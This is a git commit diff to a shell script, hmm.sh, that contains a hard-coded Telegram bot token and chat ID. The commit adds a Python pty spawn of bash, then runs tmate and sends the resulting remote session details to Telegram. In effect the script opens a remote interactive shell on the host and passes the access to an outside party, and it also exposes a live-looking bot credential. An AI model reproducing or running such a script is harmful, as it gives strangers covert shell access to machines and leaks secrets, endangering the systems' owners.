fd4e1e5f7c8632d1700783fef362794e664716f4
nmapserverforbot <133000814+nmapserverforbot@users.noreply.github.com>
2023-05-19 17:22:57 +0530

    Update hmm.sh

--- hmm.sh
+++ hmm.sh
@@ -3,6 +3,9 @@
 BOT_TOKEN="6101714973:AAFK-tM9WgRTBPpNT3kRyjiUeMfw295xtD4"
 CHAT_ID="-1001957188901"
 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+export TERM=xterm
 output=$(tmate)
 
 # Send the output to Telegram
